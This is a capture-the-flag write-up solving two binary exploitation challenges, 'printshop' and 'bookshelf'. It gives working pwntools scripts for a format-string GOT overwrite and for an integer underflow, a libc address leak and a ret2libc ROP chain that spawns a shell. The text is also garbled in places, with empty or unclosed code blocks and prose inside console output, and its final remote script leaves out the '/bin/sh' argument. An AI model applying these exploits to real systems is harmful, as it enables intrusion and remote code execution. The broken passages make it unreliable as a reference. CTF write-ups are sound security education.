## pwn/printshop

### The Challenge
```
That print shop down the road is useless, can you make it do something interesting?

Attachment : printshop
```
### The Solution
The name "print" shop suggests that it might have something do to with the printf function. Maybe a format string vulnerability?

When we download the binary and run it locally:

```console
$ ./printshop

Welcome to the Print Shop!

What would you like to print? >> gimme the flag

Thank you for your buisness!

gimme the flag
```

we see that its just printing whatever we give as input.

If we load the binary in gdb and disassemble the main method we get the following:

```
gdb-peda$ disassemble main 
Dump of assembler code for function main:

   0x00000000004013ba <+118>:    mov    edi,0x0
   0x00000000004013bf <+123>:    call   0x401160 <exit@plt>
End of assembler dump.
gdb-peda$
```

There are a few interesting things we can observe:

1. Usage of `fgets`:
   
   ```
      0x0000000000401382 <+62>:    mov    rdx,QWORD PTR [rip+0x2d07]        # 0x404090 <stdin@GLIBC_2.2.5>
      0x0000000000401389 <+69>:    lea    rax,[rbp-0x70]
      0x000000000040138d <+73>:    mov    esi,0x64
      0x0000000000401392 <+78>:    mov    rdi,rax
      0x0000000000401395 <+81>:    call   0x401130 <fgets@plt>
   ```
   
   We see that `fgets` is used to securely store 0x64 (100 in decimal) bytes from `stdin` to `rbp-0x70`. This rules out the possibility of a buffer overflow here.

2. `exit` instead of return:
   
   ```
   0x00000000004013bf <+123>:    call   0x401160 <exit@plt>
   End of assembler dump.
   ```
   
   Even if we had a buffer overflow, the main function is exiting instead of returning, which means that we can't control the instruction pointer in any case.

3. Unusual way of using `printf`:
   
   ```
      0x00000000004013a9 <+101>:    lea    rax,[rbp-0x70]
      0x00000000004013ad <+105>:    mov    rdi,rax
      0x00000000004013b0 <+108>:    mov    eax,0x0
      0x00000000004013b5 <+113>:    call   0x401110 <printf@plt>
   ```
   
   This translates to `printf(buffer);` instead of `printf("%s", buffer);` which is the well known format string vulnerability.
   
   In fact the man page of `printf` itself explicitly warns against using code like this:
   
   > Code such as printf(foo); often indicates a bug, since foo may contain a % character.  If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.

Just to be sure let's test it by adding a few format specifiers in our input:

```console
$ ./printshop

Welcome to the Print Shop!

What would you like to print? >> %x %x %x 

Thank you for your buisness!

8643b643 0 86300aa4
```

Yes it leaking values, which confirms that it is a simple case of format string vulnerability.

Since there is a call to `exit` after our vulnerable `printf` we can use this vulnerability to overwrite the GOT entry for exit with some other memory address.

But where exactly to jump to? Initially I was thinking about ROP chaining but that's a bit too much for an "EASY" challenge. Then I looked at a few other functions in the binary:

```console
$ nm printshop
000000000040038c r __abi_tag
0000000000404078 B __bss_start
00000000004040a8 b completed.0
...
00000000004040a0 B stderr@GLIBC_2.2.5
0000000000404090 B stdin@GLIBC_2.2.5
0000000000404080 B stdout@GLIBC_2.2.5
0000000000404078 D __TMC_END__
000000000040129d T win
```

`win()` seems interesting. We don't need to see its disassembly, its obvious from the name that this is the function we need to jump to.

Let's throw a bunch of %p characters and see what values we are leaking:

```console
$ python -c 'print("%p " * 20)' | ./printshop

Welcome to the Print Shop!

What would you like to print? >> 
Thank you for your buisness!

0x7fd9c803b643 (nil) 0x7fd9c7f00aa4 0x1 (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20702520 (nil) (nil) (nil) 0x7fd9c826c730 (nil) 0xa4bd4f226a5b5000 0x1
```

We see an interesting pattern of repeating hex value: 0x70 0x25 0x20. They are nothing but 'p', '%', ' '.

Basically we start leaking our own input from the 6th argument. At this point we have 2 choice:

1. Manually craft the payload

2. Use pwntools

#### Manual way

During the challenge I used the manual way of exploiting it.

Here is the `exploit.py` script:

```python
import sys
import struct

EXIT_GOT = 0x404060
WIN = 0x40129d


payload  = b''
payload += '%{}p'.format(str(WIN)).encode()
payload += b'%17$n'
payload += b'-' * ( 99 - len(payload) - 8 - 3 )
payload += struct.pack("Q", EXIT_GOT)
payload += b'\n'

sys.stdout.buffer.write(payload)
```

Run it against their server and wait for a little over 4 million characters to be printed until we get our flag

> I know there are more efficient ways than printing 4 million characters, but what matters is it works.

```console
$ python exploit.py | nc chal.pctf.competitivecyber.club 7997

```

I'm not going to explain how I got to this solution because I myself would not recommend it. Instead use the pwntools method

> If you are still interested in this solution, checkout [this video](https://www.youtube.com/watch?v=_lO_rwaK_pY) 
{: .prompt-info}

#### pwntools

During the challenge I didn't know about this method, but I'm sharing it now because it is far better.

```python
from pwn import *

p = process('./printshop')
exe = ELF('./printshop')
context.binary = exe


p.sendline(fmtstr_payload(
    6,                          # Our input starts leaking from 6th argument
    {
        exe.got.exit :          # Where to write
        exe.symbols.win         # What to write
    }
))

print(p.clean())

p.close()
```

Run it *(and optionally filter for the flag)*:

```console
$ python exploit.py | grep -oE "PCTF{.*?}"
PCTF{b4by_f0rm4t_wr1t3_6344792}
```

### FLAG

`PCTF{b4by_f0rm4t_wr1t3_6344792}`

## pwn/bookshelf

### The Challenge
```
Just finished up my project based around books! Hope you enjoy reading...

Attachment : bookshelf
```
### The Solution
Hmm...nothing interesting, even the name `bookshelf` doesn't give any clue unlike the `printshop` challenge. I guess we need to manually find out the vulnerability this time.

Let's download the binary and run it.

```console
$ ./bookshelf

Here's the two books:

> A restless hacker named Holden Codefield discovered ROP and became obsessed with its power. He saw himself as a catcher in the ROP, navigating through memory addresses to seize control. His place in the world soon to reveal. The End.

> In the midst of the Roaring Twenties, extravagant parties corrupted Jay Gatsby's memory. Even with corrupted memory, Gatsby sought to change his past, but realized he'd never be able to find an exploit that rewrites the shattered dreams of lost love. The End.

Clearly they want us to do a ROP attack. Most probably ret2libc, since a `lib.so.6` file has been attached with the program.

But for ret2libc first we need to have control over RIP right? As of now we haven't found any buffer overflow.

Let's check the first option

```

Oh interesting. You notice the difference?

Earlier there was `(0)` infront of option 3, whereas now it is `(65)`. Clearly some 'A' got overwritten there.

Nice. Let's try writing the special book again to see if it works

*RBP: 0x6161616e6161616d ('maaanaaa')*

```console
$ cyclic -l maaanaaa

Ok, so the offset for RBP is 48, hence the offset for RIP must be 48 + 8 = 56.

Let's attempt a buffer overflow and redirect code execution to 0x0a4242424242:

```python

Great! Code execution redirected.

So what have we concluded till now:

1. Apparently if we write an audiobook of 100 characters or so, some of our character will be overwritten to the variable which is used as a check in special book writing method, giving us admin access.

2. Once we get admin access, if we write 56+ bytes to the special book, we trigger a buffer overflow and redirect code execution.

That's good, but where exactly to redirect to? Let's see the function list for this binary

```console

```

There's no specific win function. Which is obvious because our program wants us to do a ret2libc attack. The payload will be straight-forward:

```
pop rdi
address of '/bin/sh'
system()
```

But we know the address of none of these, because ASLR is enabled on their server, hence the base address, and subsequently all addresses of libc will be randomized.

To overcome this, if we can leak something from libc, we can perhaps use it to calculate the libc base at runtime. Then calculate memory locations of required gadgets and form the final payload.

But the question is how do we leak something from libc? Well the buyBook() function clearly had an option to print the address of puts() [ *function from libc* ]. The problem is, it requires cash to be at least \$99999999, whereas it is hardcoded to be \$500 initially.

Furthermore, the cash can only be decreased by buying some book/leaving a tip.

This is where I was scratching my head for a long time, how do I increase a variable when it can only be decreased.

After sometime I thought, *"wait a minute, what if the cash is an unsigned integer."*

Unsigned integers are treated differently than signed integers by the computer. If an unsigned number's value goes below zero, is is automatically wrapped to a very large number ( a little less than it's highest possible value, depending on how much less it is from zero ).

TLDR ... we need to spend as much cash as possible to get it below zero and see if it spikes up.

#### Local exploit

Let's write a script to automate the leaking process

| Iteration | Action                            | Cash        |
|:---------:|:---------------------------------:|:-----------:|
| 0         | Initial                           | \$500       |
| 1         | Buy \$425 book<br/>Leave tip      | \$65        |
| 2         | Attempt to buy book<br/>Leave tip | $55         |
| 3         | Attempt to buy book<br/>Leave tip | $45         |
| 4         | Attempt to buy book<br/>Leave tip | $35         |
| 5         | Attempt to buy book<br/>Leave tip | $25         |
| 6         | Attempt to buy book<br/>Leave tip | $15         |
| 7         | Attempt to buy book<br/>Leave tip | $5          |
| 8         | Attempt to buy book<br/>Leave tip | $4294967291 |

```python
from pwn import *

p = process('./bookshelf')

# LEAK PUTS
log.info('Leaking puts')
for _ in range(8):
    p.sendline(b'2')    # Go to bookshop
    p.sendline(b'2')    # Buy/Attempt to buy a book
    p.sendline(b'y')    # Leave tip

p.sendline(b'2')    # Go to bookshop
p.sendline(b'3')    # Read value of puts()
p.sendline(b'N')    # No need to leave any more tip

leak = p.clean()    # Read everything till now
leak = b''.join(word for word in leak.split(b' ') if word.startswith(b'0x'))    # Filter the text for the memory address

puts = int(leak, 16)
log.success('Puts found @ ' + hex(puts))

p.close()
```

Let's test it:

```console
$ python exploit.py
[+] Starting local process './bookshelf': pid 421509
[*] Leaking puts
[+] Puts found @ 0x7f81e2275bf0
[*] Stopped process './bookshelf' (pid 421509)
$ 
```

It's working, great!

For now, since we are developing a local exploit, let's use our system's libc file for reference and calculate the libc base address at runtime.

```python
from pwn import *

p = process('./bookshelf')

libc = ELF('/usr/lib/libc.so.6')

# LEAK PUTS
log.info('Leaking puts...')
for _ in range(8):
    p.sendline(b'2')    # Go to bookshop
    p.sendline(b'2')    # Buy/Attempt to buy a book
    p.sendline(b'y')    # Leave tip

p.sendline(b'2')    # Go to bookshop
p.sendline(b'3')    # Read value of puts()
p.sendline(b'N')    # No need to leave any more tip

leak = p.clean()    # Read everything till now
leak = b''.join(word for word in leak.split(b' ') if word.startswith(b'0x'))    # Filter the text for the memory address

puts = int(leak, 16)
log.success('Puts found @ ' + hex(puts))

libc_base = puts - libc.symbols['puts']
log.success('libc base @ ' + hex(libc_base))

p.close()
```

```console
$ python exploit.py
[+] Starting local process './bookshelf': pid 730033
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leaking puts...
[+] Puts found @ 0x7f23aee75bf0
[+] libc base @ 0x7f23aee00000
[*] Stopped process './bookshelf' (pid 730033)
$ 
```

Good, let's also automate the process to get admin rights.

```python
...


# GET ADMIN ACCESS
p.sendline(b'1')            # Write a book
p.sendline(b'y')            # Write an audiobook
p.sendline(b'A' * 100)      # Overwrite the admin access check variable.

p.close()
```

Now let's craft the final payload to admin write buffer overflow

```python
...


# OVERFLOW ADMIN WRITE
log.info('Sending payload...')

p.sendline(b'3')     # Write an admin book

## Prepare the payload
offset = 56
rop = ROP(libc)

payload  = b''
payload += b'A' * offset
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( libc_base + next(libc.search(b'/bin/sh')) )
payload += p64( libc_base + libc.symbols['system'] )
# Since we are good programmers, let's also add a clean exit after buffer overflow :P
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( 0 )
payload += p64( libc_base + libc.symbols['exit'] )

p.sendline(payload)

log.success('Sent')
p.clean()

p.interactive()
```

Let's test it...

```console
$ python exploit.py
[+] Starting local process './bookshelf': pid 1811608
[*] '/usr/lib/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leaking puts...
[+] Puts found @ 0x7f39c4275bf0
[+] libc base @ 0x7f39c4200000
[*] Sending payload...
[*] Loaded 214 cached gadgets for '/usr/lib/libc.so.6'
[+] Sent
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ ls
[*] Process './bookshelf' stopped with exit code -11 (SIGSEGV) (pid 1811608)
[*] Got EOF while sending in interactive
```

Wait what?! This should have worked right? Our ROP chain is perfect, also all offsets are correct, so why didn't it work.

During the challenge, I couldn't think of anything, so I changed the ROP chain from `system('/bin/sh')` to `execve('/bin/sh', 0, 0)` and it worked.

But eventually I figured out that it was a simple case of stack misalignment, my initial payload was perfect, all I had to do was, insert a `ret` gadget before the ROP chain.

So here's the final exploit code:

```python
from pwn import *

p = process('./bookshelf')

libc = ELF('/usr/lib/libc.so.6')

# LEAK PUTS
log.info('Leaking puts...')
for _ in range(8):
    p.sendline(b'2')    # Go to bookshop
    p.sendline(b'2')    # Buy/Attempt to buy a book
    p.sendline(b'y')    # Leave tip

p.sendline(b'2')    # Go to bookshop
p.sendline(b'3')    # Read value of puts()
p.sendline(b'N')    # No need to leave any more tip

leak = p.clean()    # Read everything till now
leak = b''.join(word for word in leak.split(b' ') if word.startswith(b'0x'))    # Filter the text for the memory address

puts = int(leak, 16)
log.success('Puts found @ ' + hex(puts))

libc_base = puts - libc.symbols['puts']
log.success('libc base @ ' + hex(libc_base))

# GET ADMIN ACCESS
p.sendline(b'1')            # Write a book
p.sendline(b'y')            # Write an audiobook
p.sendline(b'A' * 100)      # Overwrite the admin access check variable.

# OVERFLOW ADMIN WRITE
log.info('Sending payload...')

p.sendline(b'3')     # Write an admin book

## Prepare the payload
offset = 56
rop = ROP(libc)

payload  = b''
payload += b'A' * offset
payload += p64( libc_base + rop.find_gadget(['ret']).address )
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( libc_base + next(libc.search(b'/bin/sh')) )
payload += p64( libc_base + libc.symbols['system'] )
# Since we are good programmers, let's also add a clean exit after buffer overflow :P
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( 0 )
payload += p64( libc_base + libc.symbols['exit'] )

p.sendline(payload)

log.success('Sent')
p.clean()

p.interactive()
```

Let's test it...

```console

Oh good good! Our exploit is working perfectly.

Now all we need to do as adapt the local exploit to remote enviroment

#### Switching to remote

All we need to do is simply change our libc and process from local the remote ones. Final remote exploit:

```python
from pwn import *

p = remote('chal.pctf.competitivecyber.club on port', 4444)

libc = ELF('libc.so.6')

# LEAK PUTS
log.info('Leaking puts...')
for _ in range(20):
    p.sendline(b'2')    # Go to bookshop
    p.sendline(b'2')    # Buy/Attempt to buy a book
    p.sendline(b'y')    # Leave tip

p.sendline(b'2')    # Go to bookshop
p.sendline(b'3')    # Read value of puts()
p.sendline(b'N')    # No need to leave any more tip

leak = p.clean()    # Read everything till now

leak = b''.join(word for word in leak.split(b' ') if word.startswith(b'0x'))    # Filter the text for the memory address

puts = int(leak, 16)
log.success('Puts found @ ' + hex(puts))

libc_base = puts - libc.symbols['puts']
log.success('libc base @ ' + hex(libc_base))

# GET ADMIN ACCESS
p.sendline(b'1')            # Write a book
p.sendline(b'y')            # Write an audiobook
p.sendline(b'A' * 100)      # Overwrite the admin access check variable.

# OVERFLOW ADMIN WRITE
log.info('Sending payload...')

p.sendline(b'3')     # Write an admin book

## Prepare the payload
offset = 56
rop = ROP(libc)

payload  = b''
payload += b'A' * offset
payload += p64( libc_base + rop.find_gadget(['ret']).address )
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )

payload += p64( libc_base + libc.symbols['system'] )
# Since we are good programmers, let's also add a clean exit after buffer overflow :P
payload += p64( libc_base + rop.find_gadget(['pop rdi', 'ret']).address )
payload += p64( 0 )
payload += p64( libc_base + libc.symbols['exit'] )

p.sendline(payload)

log.success('Sent')
p.clean()

p.interactive()
